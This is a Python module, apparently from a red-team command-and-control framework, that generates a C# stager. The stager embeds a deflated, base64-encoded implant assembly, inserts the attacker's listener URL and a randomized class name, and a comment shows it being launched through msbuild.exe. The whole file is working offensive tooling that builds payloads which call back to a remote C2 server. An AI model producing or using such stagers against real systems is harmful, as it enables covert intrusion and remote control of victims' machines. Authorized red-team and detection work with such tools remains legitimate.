from core.teamserver.stager import Stager
from core.utils import gen_random_string_no_digits
from core.teamserver.utils import dotnet_deflate_and_encode


class STStager(Stager):
    def __init__(self):
        self.name = 'csharp'
        self.description = 'Stage via CSharp source file'
        self.suggestions = ''
        self.extension = 'cs'
        self.author = '@byt3bl33d3r'
        self.options = {}

    def generate(self, listener):
        with open('./core/teamserver/data/naga.exe', 'rb') as assembly:
            with open('./core/teamserver/stagers/templates/csharp.cs') as template:
                template = template.read()
                template = template.replace("CLASS_NAME", gen_random_string_no_digits(8))
                template = template.replace('C2_URL', f"{listener.name}://{listener['BindIP']}:{listener['Port']}")
                template = template.replace("BASE64_ENCODED_ASSEMBLY", dotnet_deflate_and_encode(assembly.read()))
                return template

                #print_good(f"Generated stager to {stager.name}")
                #print_info(
                #    f"Launch with 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe {stager_filename}'")
